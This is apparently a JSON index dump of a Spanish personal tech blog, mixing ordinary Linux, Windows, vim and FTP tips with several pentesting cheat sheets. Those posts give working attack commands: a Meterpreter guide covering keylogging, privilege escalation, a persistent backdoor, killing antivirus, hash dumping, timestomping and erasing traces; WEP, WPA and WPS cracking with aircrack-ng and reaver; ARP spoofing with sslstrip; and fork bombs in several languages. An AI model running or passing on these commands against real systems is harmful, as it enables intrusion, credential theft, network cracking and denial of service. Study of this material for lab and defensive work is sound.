problema de red en gnome"},{"content":"Mostrar procesos ps -A\nMatar proceso por pid sudo kill 'pid'\nhay distintos números para mandar al proceso a la hora de matarlo 1..9\nMatar procesos por nombre sudo killall php\nMatar por entorno gráfico sudo xkill\n","date":"2015-10-04T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/procesos/","title":"Eliminar procesos por id"},{"content":"sudo nmap -O localhost | grep \u0026quot;open\u0026quot;\nsudo fuser -n tcp puerto\nsudo ps -l PID\nsudo /etc/init.d/aplicación stop\nmatar por la fuerza sudo fuser -nk tcp puerto\nsudo killall servicio\nsudo kill -9 PID\n","date":"2015-10-03T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/puertos/","title":"Ver puertos abiertos"},{"content":" 1 2 3 4 5 6 deb http://ftp.es.debian.org/debian/ wheezy main deb-src http://ftp.es.debian.org/debian/ wheezy main deb http://security.debian.org/ wheezy/updates main deb-src http://security.debian.org/ wheezy/updates main deb http://http.es.debian.org/debian/ wheezy universe debian multimedia 1 2 deb http://www.deb-multimedia.org wheezy main non-free deb-src http://www.deb-multimedia.org wheezy main non-free Depot MultiSystem 1 2 deb http://liveusb.info/multisystem/depot all main deb-src http://liveusb.info/multisystem/depot all main Tor Project 1 2 deb http://deb.torproject.org/torproject.org lucid main deb-src http://deb.torproject.org/torproject.org lucid main Google Chrome 1 deb http://dl.google.com/linux/chrome/deb/ stable main Dropbox 1 deb http://linux.dropbox.com/debian wheezy main Spotify 1 deb http://repository.spotify.com stable non-free Debian wheezy Java 1 2 deb http://ftp.us.debian.org/debian wheezy contrib non-free deb http://ftp.us.debian.org/debian wheezy contrib ","date":"2015-10-02T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/sources_list/","title":"Repositorios mas usados"},{"content":"Para poner nuestro teclado en español en la mayoría de distribuciones setxkbmap es\nHe encontrado unas cuantas distribuciones en las que no funciona, sobre todo las minimalistas o compiladas para antenas, router, etc\n","date":"2015-10-01T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/teclado_espa%C3%B1ol/","title":"Cambiar el idioma del teclado"},{"content":"copy /B archivo1+archivo2+archivoN archivoNuevo\nPasos: el gringo creo la carpeta \u0026ldquo;X\u0026rdquo; en el disco duro C: (esto para hacer el proceso mas fácil)\nSeguidamente copio a esa carpeta, los archivos que realmente desea compartir y también la imagen que servirá solo como fachada\nSeleccionas los \u0026ldquo;archivos importantes\u0026rdquo; y los comprimes dentro de un archivo con un nombre corto (para facilitar el tramite) el gringo le dio el nombre \u0026ldquo;X\u0026rdquo;, pero pudo haberle puesto \u0026ldquo;PERRO\u0026rdquo;, \u0026ldquo;GATO\u0026rdquo;, etc. Realmente puede usar cualquier compresor sea Winrar o Winzip para crear el comprimido.\nTe vas a usar la linea de comandos para eso pulsas: INICIO \u0026gt; EJECUTAR o START \u0026gt; RUN en ingles. Seguidamente escribe CMD y pulsas ENTER. A continuación estarás en una ventana de fondo negro en donde: A) escribirás: CD\\X y pulsa ENTER (entrar a la carpeta que contiene los archivos) B) escribes COPY /B [nombre de archivo de imagen.extensión] + [nombre de archivo comprimido.extensión] [Nombre del archivo destino.extensión JPG]\nSegun el video: COPY /B cow.jpg + x.7z secretcow.jpg\ny Listo!!! al abrir el archivo secretcow.jpg normalmente lo que encuentra en primer lugar es la cabecera del archivo de imagen y abre la imagen.\nPero si abres 7zip Manager (7zip si es obligatorio para sacar los archivos ocultos) podrás abrir el archivo SECRETCOW.jpg y lo que te aparecerán son los archivos contenidos dentro del archivo comprimido.\nLos descomprimes y listo.\nNota: No solamente funciona con JPG sino tambien con archivos GIF (ya lo probé) y tal vez funcione con otros tipos de archivos.\n","date":"2015-09-12T00:00:00Z","image":"https://www.procamora.com/covers/windows.png","permalink":"https://www.procamora.com/p/estenagrogafia_windows/","title":"Uso de estenagrofia"},{"content":"Tienes que ejecutar la consola como administrador bcdedit\nbcdedit /set {identifier} description \u0026quot;lo que quieras que salga\u0026quot;\n","date":"2015-09-11T00:00:00Z","image":"https://www.procamora.com/covers/windows.png","permalink":"https://www.procamora.com/p/arranque_dual_windows/","title":"Crear un aranque dual en windows"},{"content":"Para crear un usuario administrador a través de la consola: 1. Creamos un usuario net user /add SuperAdmin\n2. Metemos dentro del grupo Administradores el usuario creado net localgroup administradores SuperAdmin /add\n3. Asignamos una contraseña al usuario creado net user SuperAdmin \u0026quot;contraseña\u0026quot;\n","date":"2015-09-10T00:00:00Z","image":"https://www.procamora.com/covers/windows.png","permalink":"https://www.procamora.com/p/crear_administrador_windows/","title":"Crar administrador por consola"},{"content":"background Permite establecer el proceso de la consola meterpreter a un proceso “demonio” con lo que posteriormente permitirá volver al contexto de ejecución anterior a la obtención de la consola, eventualmente se puede volver a activar este proceso por medio del comando sesión:\nmeterpreter \u0026gt; background\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf exploit(handler) \u0026gt; sessions -l Active sessions =============== Id Type Information Connection 1 meterpreter x86/win32 OWNER\\Owner @ OWNER 192.168.1.33:443 -\u0026gt; 192.168.1.34:1091 msf exploit(handler) \u0026gt; sessions -i 1 [\\*] Starting interaction with 1… meterpreter \u0026gt; keyscan Con esta utilidad es posible saber que ha digitado el usuario en su maquina, de esta se obtiene fácilmente, claves, usuarios, direcciones, mensajes, etc.\nSu uso:\nmeterpreter \u0026gt; keyscan_start\nStarting the keystroke sniffer…\nCon esto se ha iniciado el keylogger, posteriormente para consultar lo que se digitado: meterpreter \u0026gt; keyscan_dump\nDumping captured keystrokes…\nt l gmail.com usuario passSuperSegura Finalmente para detener el servicio basta con:\nmeterpreter \u0026gt; keyscan_stop\nStopping the keystroke sniffer…\ngetuid , getsystem \u0026lt;Priv: Elevate Commands\u0026gt; y rev2self Con estos comandos se pueden hacer operaciones de consulta y manipulación de cuentas de usuarios\nPara obtener el usuario en sesión 1 2 3 \u0026gt; meterpreter \u0026gt; `getuid` Server username: OWNER\\Owner Para obtener la cuenta del usuario SYSTEM meterpreter \u0026gt; getsystem\ngot system (via technique 1). 1 2 3 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM Para volver a la sesión anterior 1 2 3 4 5 meterpreter \u0026gt; rev2self meterpreter \u0026gt; getuid Server username: OWNER\\Owner migrate Permite migrar el proceso de Meterpreter a otro proceso activo, su uso es muy simple basta con especificar un PID activo (que puede ser consultado utilizando el comando “ps” de Meterpreter).\nmeterpreter \u0026gt; migrate 1780\nDe esta forma, cuando se cierre el proceso en ejecución anteriormente asociado al proceso de Meterpreter, este será “migrado” al proceso especificado, se recomienda que el PID sea el de el proceso explorer.exe o uno que tenga relación con los procesos del sistema operativo.\ngetgui Con este comando es posible acceder al escritorio remoto de la maquina objetivo, en concreto, lo que permite este comando es activar el escritorio remoto de la maquina comprometida.\nSu uso resulta muy sencillo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 meterpreter \u0026gt; run getgui -e [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator [*] Carlos Perez carlos_perez@darkoperator.com [*] Enabling Remote Desktop [*] RDP is disabled; enabling it … [*] Setting Terminal Services service startup mode [*] The Terminal Services service is not set to auto, changing it to auto … [*] Opening port in local firewall if necessary [*] For cleanup use command: run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20110307.0914.rc Posteriormente podemos conectarnos al escritorio remoto usando el comando rdesktop con una sintaxis similar al siguiente: rdesktop -u juan -p juan 192.168.1.34\nCabe notar que el usuario y el password especificados pueden corresponder a un usuario creado anteriormente con incógnito, aunque evidentemente se puede utilizar cualquier otro usuario con credenciales validas.\nNota: En sistemas operativos XP y otros que no soporten múltiples sesiones de escritorio remoto, esta acción hará que el usuario logueado en la maquina remota pierda su sesión, por ende es necesario tener prudencia con este tipo de acciones, principalmente para no alertar al usuario sobre las acciones que se están llevando a cabo, esto también aplica a la creación de usuarios, dado que es bastante notorio cuando un usuario se ha creado en el sistema.\nFinalmente, se limpia lo que se ha hecho para no dejar rastros, para esto se utiliza el comando: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 meterpreter \u0026gt; run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20110307.0914.rc [*] Running Command List … [*] Running command reg setval -k ‘HKLM\\System\\CurrentControlSet\\Control\\Terminal Server’ -v ‘fDenyTSConnections’ -d \u0026#34;1\u0026#34; Successful set fDenyTSConnections. [*] Running command execute -H -f cmd.exe -a “/c sc config termservice start= disabled” Process 580 created. [*] Running command execute -H -f cmd.exe -a “/c sc stop termservice” Process 3184 created. [*] Running command execute -H -f cmd.exe -a “/c ‘netsh firewall set service type = remotedesktop mode = enable’” Process 1312 created. metsvc Permite definir un proceso persistente en la maquina objetivo que se encontrará a la espera de una nueva conexión por parte del atacante, para esto será necesario en primer lugar “migrar” el proceso de la sesión meterpreter actual a otro proceso “persistente” del objetivo, del modo en el que se ha indicando anteriormente con el comando migrate, por este motivo los procesos que resultan mas interesantes son aquellos propios del sistema operativo, posteriormente se puede ejecutar:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 meterpreter \u0026gt; run metsvc [*] Creating a meterpreter service on port 31337 [*] Creating a temporary installation directory C:\\DOCUME~1\\Owner\\LOCALS~1\\Temp\\lZBdswMe… [*] \u0026gt;\u0026gt; Uploading metsrv.dll… [*] \u0026gt;\u0026gt; Uploading metsvc-server.exe… [*] \u0026gt;\u0026gt; Uploading metsvc.exe… [*] Starting the service… * Installing service metsvc * Starting service Service metsvc successfully installed. Como se puede apreciar la backdoor se ha instalado correctamente en el objetivo, ahora es posible realizar una conexión activa (ya no es necesario esperar de forma pasiva a que un usuario ejecute el fichero .exe que habilitará la sesión meterpreter).\nkillav\nEn muchas ocasiones en la maquina objetivo existen programas de antivirus instalados, lo que dificultará tareas comunes e inclusive triviales, por esta razón existe el script killav que intentará terminar todos los procesos de antivirus en el objetivo: meterpreter \u0026gt; run killav\n1 2 3 4 5 [*] Killing Antivirus services on the target… [*] Killing off avgrsx.exe… meterpreter \u0026gt; Aunque con este comando se supone que se deberían eliminar los procesos de monitoreo como Antivirus, en algunos casos no funciona correctamente, en especial cuando se trata de antivirus que tienen procesos persistentes/resilentes y que no pueden ser detenidos con los mecanismos convencionales, es en estos casos en los que se deben emplear mecanismos mas elaborados para desactivar esta clase de servicios en la maquina comprometida, aquí entra en juego un proceso de recolección de información y análisis de las defensas del objetivo.\nroute Se trata del conocido comando route en sistemas windows/linux, permite conocer y definir las tablas de enrutamiento del sistema\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 meterpreter \u0026gt; route list Network routes ============== Subnet Netmask Gateway —— ——- ——- 0.0.0.0 0.0.0.0 192.168.1.1 127.0.0.0 255.0.0.0 127.0.0.1 192.168.1.0 255.255.255.0 192.168.1.34 192.168.1.34 255.255.255.255 127.0.0.1 192.168.1.255 255.255.255.255 192.168.1.34 224.0.0.0 240.0.0.0 192.168.1.34 255.255.255.255 255.255.255.255 192.168.1.34 cd, rm, rmdir, pwd, ls, upload, download, cat edit, del, mkdir Se trata de los comandos básicos para consulta y manipulación de ficheros, su uso es equivalente a los comandos del mismo nombre disponibles en sistemas basados en UNIX, sin embargo estos comandos se ejecutan en el sistema remoto por medio del interprete meterpreter\ncd: Permite navegar a través de la estructura de directorios, rm y del eliminar un fichero especificado, pwd, conocer el directorio actual en donde apunta meterpreter, upload para subir un fichero a la maquina remota, download, descargar un fichero desde la maquina remota, mkdir crear un directorio nuevo, cat Permite visualizar un fichero remoto, mientras que edit, permite editarlo con el uso de vi\nComo se puede apreciar, se trata de comandos de fácil uso y bastante similares a los comandos clásicos en cualquier sistema Unix.\nIdletime Permite determinar cuanto ha sido el tiempo en el que el usuario de la maquina remota ha permanecido sin actividad:\nmeterpreter \u0026gt; idletime\nUser has been idle for: 15 mins 57 secs\nmeterpreter \u0026gt; idletime\nUser has been idle for: 16 mins\nchannel , execute , interact read, write, close Para definir diferentes procesos que se ejecuten en la maquina remota y posteriormente declararlos como canales para ser manejados por meterpreter por medio del uso del comando channel:\nmeterpreter \u0026gt; execute -f cmd -c\nProcess 3356 created.\nChannel 11 created.\nmeterpreter \u0026gt; getpid\nCurrent pid: 1836\nmeterpreter \u0026gt; execute -f cmd -c\nProcess 2772 created.\nChannel 12 created.\nmeterpreter \u0026gt; execute -f cmd -c\nProcess 2860 created.\nChannel 13 created.\nComo se ha podido apreciar, se han creado diferentes canales con un proceso asociado, posteriormente es posible consultarlos con el comando channel:\nmeterpreter \u0026gt; channel -l\nId Class Type\n– —– —-\n11 3 stdapi_process\n12 3 stdapi_process\n13 3 stdapi_process\nSi se desea interactuar con alguno de esto canales, se utiliza el comando “interact” para definir alguno de los canales creados y posteriormente interactuar con él.\nmeterpreter \u0026gt; interact 11\nInteracting with channel 11…\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nc:\u0026gt;exit\nmeterpreter \u0026gt; channel -l\nId Class Type\n– —– —-\n12 3 stdapi_process\n13 3 stdapi_process\nOtra forma de interactuar con un canal, es utilizando los comandos read y write, que permiten enviar flujos de datos a un canal definido de una forma sencilla:\nmeterpreter \u0026gt; write 12\nEnter data followed by a ‘.’ on an empty line:\necho “Hola!”\n.\n[*] Wrote 13 bytes to channel 12.\nmeterpreter \u0026gt; read 12\nRead 116 bytes from 12:\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nc:\u0026gt;echo “Hola!”\n“Hola!”\nFinalmente con el comando close, se cierra algún canal que se encuentre abierto\n1 2 3 4 5 meterpreter \u0026gt; close 12 [*] Closed channel 12. meterpreter \u0026gt; channel -l Id Class Type\n– —– —-\n13 3 stdapi_process\ngetdesktop \u0026lt;Stdapi, User Interface Commands\u0026gt;, enumdesktops setdesktop Estos comandos permiten obtener el desktop del usuario actual, establecerlo y enumerar las diferentes interfaces habilitadas en la maquina objetivo, cada uno de los desktop están asociados a una sesión (normalmente la sesión, 0 se relaciona con el usuario actualmente conectado y las demás con usuarios remotos) una estación (que normalmente es la Windows Station) y un nombre de Desktop, este nombre identifica la interfaz que se enseña al usuario, por ejemplo tenemos una para el inicio de sesión, otra para el escritorio y otra para logoff.\nmeterpreter \u0026gt; enumdesktops\nEnumerating all accessible desktops\nDesktops\n========\nSession Station Name\n——- ——- —-\n0 WinSta0 Default\n0 WinSta0 Disconnect\n0 WinSta0 Winlogon\n0 SAWinSta SADesktop\nPara saber en que desktop se encuentra asociada la sesión meterpreter basta con invocar el método getdesktop:\n1 2 3 meterpreter \u0026gt; getdesktop Session 0\\WinSta0\\Default Cada uno de los desktop tiene sus propios procesos en ejecución y ademas de esto, tienen su propio buffer de teclado y dispositivos de entrada, por lo tanto cuando se realiza el monitoreo de teclas del objetivo, es necesario conocer el desktop actual de ejecución y también es necesario que el proceso del cual depende meterpreter se encuentre en ejecución para dicho desktop, por esta razón es posible que el mismo monitoreo de teclas (utilizando keyscan_*) no funcione de la misma forma para el desktop de inicio de sesión que para el escritorio de un usuario logueado.\nTIP: Una vez explicado lo anterior, una practica frecuente que utiliza un atacante cuando logra comprometer un sistema, es establecer después de un periodo corto de tiempo, el desktop asociado con el login de usuario y posteriormente iniciar el escaneo de teclas para dicho desktop, de esta forma es muy fácil capturar las credenciales del usuario que se esta logueando en el sistema.\nuictl, hashdump, timestomp el comando uictl permite habilitar/deshabilitar el ratón y el teclado de la maquina destino, de esta forma, se puede controlar las acciones que el usuario realiza.\nmeterpreter \u0026gt; uictl\nUsage: uictl [enable/disable] [keyboard/mouse]\nmeterpreter \u0026gt; uictl disable keyboard\nDisabling keyboard…\nmeterpreter \u0026gt; uictl enable keyboard\nEnabling keyboard…\nmeterpreter \u0026gt; uictl disable mouse\nDisabling mouse…\nmeterpreter \u0026gt; uictl enable mouse\nEnabling mouse…\nEl comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 meterpreter \u0026gt; hashdump Administrator:500:asdfghjkll1404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ASPNET:1004:f398e05bcb3llllllf92d55aff8ce62c:86ceb0fb2a9e29524943fed3ef434477::: daniel:1007:f920b27cf8b06ac9alllllllb51404ee:c52abb1e14677d7ea228fcc1171ed7b7::: Guest:501:aad3b435b51404eeaad3b4lllll404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HelpAssistant:1000:4d6764bf7636541b9llllll97b8f8a9d:d266eba66369591255d597bc76155cd8::: Owner:1003:cf6a21dcd4401f45f500944b531lllll5f631567587db2a3d87618c0660be3a3::: postgres:1005:f554be491f92036e46cfff875cbe0lld:2b11a19bd88a25d3e2d07cb7cc362044::: SUPPORT_388945a0#:1002:aad3b435b51404eelld3b435b51404ee:5376b4d52202b447093e4651b63d1572::: Por otro lado con timestomp se pueden modificar los atributos relacionados con las fechas de creación y modificación de un fichero en la maquina remota.\nCon la siguiente instrucción se puede cambiar la fecha de creación del fichero.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 meterpreter \u0026gt; timestomp C:\\AUTOEXEC.BAT -c \u0026#34;10/10/2010 10:10:10\u0026#34; [*] Setting specific MACE attributes on C:AUTOEXEC.BAT Con la siguiente instrucción se puede cambiar la fecha de modificación del fichero. meterpreter \u0026gt; timestomp C:\\AUTOEXEC.BAT -m \u0026#34;10/10/2010 10:10:10\u0026#34; [*] Setting specific MACE attributes on C:AUTOEXEC.BAT Con la siguiente instrucción se puede cambiar la fecha de ultimo acceso del fichero. meterpreter \u0026gt; timestomp C:\\AUTOEXEC.BAT -a \u0026#34;10/10/2010 10:10:10\u0026#34; [*] Setting specific MACE attributes on C:AUTOEXEC.BAT Las opciones suministradas por el comando son: meterpreter \u0026gt; timestomp -h Usage: timestomp file_path OPTIONS OPTIONS: -a \u0026lt;opt\u0026gt; Set the “last accessed” time of the file -b Set the MACE timestamps so that EnCase shows blanks -c \u0026lt;opt\u0026gt; Set the “creation” time of the file -e \u0026lt;opt\u0026gt; Set the “mft entry modified” time of the file -f \u0026lt;opt\u0026gt; Set the MACE of attributes equal to the supplied file -h Help banner -m \u0026lt;opt\u0026gt; Set the “last written” time of the file -r Set the MACE timestamps recursively on a directory -v Display the UTC MACE values of the file -z \u0026lt;opt\u0026gt; Set all four attributes (MACE) of the file ","date":"2015-09-08T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/meterpreter/","title":"meterpreter"},{"content":"Concatenadores y Operadores Concatenadores 1 2 \u0026amp;\u0026amp; —\u0026gt; AND lógico (y) || —\u0026gt; OR lógico (ó) Operadores 1 2 3 contains —\u0026gt; Contener (se usa cuando no sabemos exáctamente todo) == —\u0026gt; Comparación (igual) != —\u0026gt; Comparación (desigual) Nota: Cuando se trata de igualdades, siempre hay dos símbolos. Si la igualdad es un número, se pone este directamente. Si es una cadena de texto, se ha de poner con comillas.\nProtocolos 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ssl —\u0026gt; Protocolo SSL (capa segura). telnet —\u0026gt; Telnet. dns —\u0026gt; DNS. msnms —\u0026gt; Mensajería Instantánea (Messenger). ftp —\u0026gt; Protocolo FTP (podriamos ver el nombre de usuario y contraseña). ftp-data —\u0026gt; Nos permite ver los datos del protocolo FTP. ip —\u0026gt; Protocolo IP. ip.src==192.168.1.1 —\u0026gt; Dirección IP de Origen. ip.dst==192.168.1.1 —\u0026gt; Dirección IP de Destino. tcp —\u0026gt; Protocolo TCP tcp.port==80 —\u0026gt; Indicamos los paquetes con el puerto deseado. tcp.srcport==80 —\u0026gt; Indicamos el puerto de origen. tcp.dstport==80 —\u0026gt; Indicamos el puerto de destino. http —\u0026gt; Protocolo HTTP http.host==\u0026#34;www.google.com\u0026#34; —\u0026gt; Queremos ver los paquetes que tengan a Google como host. http.date==\u0026#34;Wed, 30 Mar 2011 22:40:55 GMT\u0026#34; —\u0026gt; Paquetes con respecto a una fecha http.content_type==\u0026#34;application/json\u0026#34; —\u0026gt; Según el tipo. Hay más tipos http.content_type==\u0026#34;image/png\u0026#34; —\u0026gt; Imágenes PNG http.content_type==\u0026#34;image/gif\u0026#34; —\u0026gt; Imágenes GIF http.content_type==\u0026#34;image/jpeg\u0026#34; —\u0026gt; Imágenes JPEG http.content_type==\u0026#34;text/html\u0026#34; —\u0026gt; Archivos HTML http.content_type==\u0026#34;text/css\u0026#34; —\u0026gt; Hojas de estilo CSS http.content_type==\u0026#34;video/quicktime\u0026#34; —\u0026gt; Vídeos http.content_type==\u0026#34;application/zip\u0026#34; —\u0026gt; Archivos ZIP http.request.method==\u0026#34;GET\u0026#34; —\u0026gt; Tipo de Petición GET http.request.method==\u0026#34;POST\u0026#34; —\u0026gt; Tipo de Petición POST http.user_agent contains “Mozilla\u0026#34; —\u0026gt; Navegador Mozilla http.request.uri!=*—\u0026gt; Con esto me libro de los paquetes “NOTIFY * HTTP…\u0026#34; http.request.uri matches “[0-9]“ —\u0026gt; Uso de expresiones regulares. ","date":"2015-09-07T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/wireshark/","title":"Comandos Wireshark"},{"content":" 1 2 3 4 5 airmon-ng airmon-ng stop wlan0 ifconfig wlan0 down macchanger --mac 00:11:22:33:44:55 wlan0 airmon-ng start wlan0 \u0026ndash;AHORA EMPEZAMOS\u0026ndash;\nairodump-ng wlan0\nairodump-ng -c '6' -w 'paquetes' --bssid 'A0:21:B7:D5:A8:78' wlan0\n-c = canal (CH), -w = lugar donde se guardan los paquetes, \u0026ndash;bssid = es el BSSID\naireplay-ng -1 0 -a 'A0:21:B7:D5:A8:78' -h '00:11:22:33:44:55' -e 'wifyrocky' wlan0\n-a = BSSID que atacamos, -h = mac nuestra, -e = nombre wify que atacamos\naireplay-ng -3 -b 'A0:21:B7:D5:A8:78' -h '00:11:22:33:44:55' wlan0\n-b = BSSID que atacamos, -h = mac nuestra\naircrack-ng 'paquetes-01.cap'\ndonde están guardados los paquetes\n","date":"2015-09-06T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/wep/","title":"Wep"},{"content":"WPA / WPA2 Cracking 1. Para saber que wlan tenemos. airmon-ng\n2. Para parar la wlan0. airmon-ng stop wlan0\n3. Para bajar el adaptador wifi y poder modificar su mac ifconfig wlan0 down\n4. Para cambiar la mac, podemos poner la que queramos. macchanger --mac [00:11:22:33:44:55] wlan0\n5. Para volver a activar la wlan0. airmon-ng start wlan0\n6. Para escanear las redes cercanas. Nos interesan las BSSID y la STATION. airodump-ng mon0\n7. En \u0026ndash;channel ponemos el CH, en \u0026ndash;bssid la MAC y en -w ponemos la direccion de donde queremos que se guarden los .cap. airodump-ng mon0 --channel 11 --bssid [A0:21:B7:D5:A8:78] -w [/tmp/wpa2]\n8. Para inyectar paquetes y capturar el Handshake, en -a ponemos la BSSID, en -c ponemos la STATION. aireplay-ng -0 11 -a [A0:21:B7:D5:A8:78] -c [00:12:F0:D3:30:BC] mon0\nUna vez hecho esto solo nos queda desencriptar la password, lo podemos hacer de dos maneras por medio de diccionario o bruteandola con el Jonh The Ripper\n9. Crackear con diccionario, -w aqui la dirección del diccionario -b la dirección MAC, y por ultimo la dirección de donde se guardaban los paquetes .cap aircrack-ng -w [/pentest/passwords/wordlists/darkc0de.lst] -b [A0:21:B7:D5:A8:78] [/tmp/wpa2-01.cap]\n","date":"2015-09-05T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/wpa/","title":"wpa"},{"content":"sysctl -w net.ipv4.ip_forward=1\ncat /proc/sys/net/ipv4/ip_forward\necho 1 \u0026gt; /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n######opcional arpspoof -i eth0 -t 192.168.1.2 192.168.1.1\n######otra pestaña python sslstrip.py -l 1000\n######otra pestaña ettercap -Tq -i eth0 o ettercap -T -q -i eth0 -M arp // //\n","date":"2015-09-04T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/ssltrip2/","title":"sslstrip"},{"content":"airmon-ng start wlan0\nwash -i mon0\nreaver -i mon0 -b 30:46:9A:7C:C4:CA -vv -c 8\niwconfig\nairmon-ng start wlan0\nairodump-ng mon0\nreaver -i mon0 -vv -b (BSSID del target del AP ) -S -L\n1 2 3 4 5 -vv: para indicarle que nos muestre como va haciendo su trabajo. -i: el interface. -b: BSSID del target del AP. -S: para que utilice claves pequeñas DH para mejorar la velocidad. -L: para ignorar el estado locked que nos envía el AP. ","date":"2015-09-03T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/reaver/","title":"Reaver"},{"content":" 1 2 3 4 5 echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 arpspoof -i eth0 -t \u0026#34;ip objetivo\u0026#34; \u0026#34;ip puerta enlace\u0026#34; python ssltrip.py python ssltrip.py -v log Todo esto hay que hacerlo como root\n","date":"2015-09-02T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/ssltrip/","title":"ssltrip"},{"content":"Ejemplo de una bomba fork Código fuente de una bomba fork programada en Batch funcional en cualquier versión de Microsoft Windows: 1 %0|%0 O bien, una reacción más rápida:\n1 2 3 :s start \u0026#34;\u0026#34; %0 goto :s Código fuente de una bomba fork programada en UNIX C o C++: 1 2 3 4 5 #include \u0026lt;unistd.h\u0026gt; void main() { while(1) fork(); } Bomba fork para bash de linux 1 :(){ :|:\u0026amp; };: Perl: 1 fork while fork Python: 1 2 3 import os while True: os.fork() Ruby: 1 2 3 4 5 6 7 8 def forkbomb loop { fork { forkbomb } } end; forkbomb ","date":"2015-09-01T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/bomba_fork/","title":"Tipos de bombas fork"},{"content":"0. Instalar los paquetes necesarios apt-get install pure-ftpd pureadmin\n1. Creación de un usuario y grupo para el FTP sudo groupadd ftpgroup\nsudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser\n2. Creación de un directorio para el FTP sudo mkdir /home/ftp\n3. Creación de un usuario FTP sudo pure-pw useradd usuario -u ftpuser -d /home/ftp\n4. Creación de base de datos del usuario sudo pure-pw mkdb\n5. Hacemos un link al archivo PureDB sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/PureDB\n6. Denegamos acceso a anonymous sudo echo yes \u0026gt; /etc/pure-ftpd/conf/NoAnonymous\n7. Denegamos autenticación PAM sudo echo no \u0026gt; /etc/pure-ftpd/conf/PAMAuthentication\n#####Algunas configuraciones adicionales serían:\n8. Limitar el número de usuarios sudo echo 10 \u0026gt; /etc/pure-ftpd/conf/MaxClientsNumber\n9. No permitir mostrar los ficheros ocultos sudo echo no \u0026gt; /etc/pure-ftpd/conf/DisplayDotFiles\n10. Denegar lectura y escritura de ficheros ocultos sudo echo yes \u0026gt; /etc/pure-ftpd/conf/ProhibitDotFilesRead\nsudo echo yes \u0026gt; /etc/pure-ftpd/conf/ProhibitDotFilesWrite\n11. Prohibimos ejecución de chmod sudo echo yes \u0026gt; /etc/pure-ftpd/conf/NoChmod\n12. Reiniciamos el servicio sudo invoke-rc.d pure-ftpd restart\n######11. Verificamos que la configuración concuerde con la que hicimos sudo pure-pw show usuario\nY ya podemos disfrutar de nuestro FTP!\nEl monitoreo puede ser por consola a gráficamente\nsudo pure-ftpwho sudo pureadmin\n","date":"2015-08-03T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/pure_ftpd/","title":"Configurar pure-ftpd"},{"content":"popcorn time es un programa para streaming de películas y series Primero añadimos lso repositorios a nuestro sistema sudo echo \u0026quot;deb http://ppa.launchpad.net/webupd8team/popcorntime/ubuntu trusty main\u0026quot; | tee /etc/apt/sources.list.d/webupd8team-popcorntime.list\nsudo echo \u0026quot;deb-src http://ppa.launchpad.net/webupd8team/popcorntime/ubuntu trusty main\u0026quot; | tee -a /etc/apt/sources.list.d/webupd8team-popcorntime.list\nAñadimos la clave publica para certificar que es un paquete valido sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EEA14886\nActualizamos nuestros repositorios sudo apt-get update\nInstalar popcorn time sudo apt-get install popcorn-time\nYa podemos ejecutarlo, se pondrá en la lista de internet en gnome popcorn-time\n","date":"2015-08-02T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/popcorn_time/","title":"Instalar popcorn-time"},{"content":"Modo edición habilitar la edición i o o\nOperaciones básicas Salir :q\nSalir sin confirmación :q!\nSalir guardando sin confirmación :wq!\nGuardar en un fichero x :w fichero.txt\nCierra el actual y abre x :e fichero.txt`\nCopiar, cortar, pegar Modo visual v\nCortar c\nCopiar y\nPegar p\nOperadores de texto suprimir linea dd\ndeshacer ultimo cambio u\nrehacer ultimo cambio CTRL+R\nconvertir a minus la linea guu\nconvertir a mayus la linea gUU\nposicionarse en linea \u0026rsquo;num' :num\nMostrar el número de líneas :set number\nposicionarse al principio gg\nposicionarse 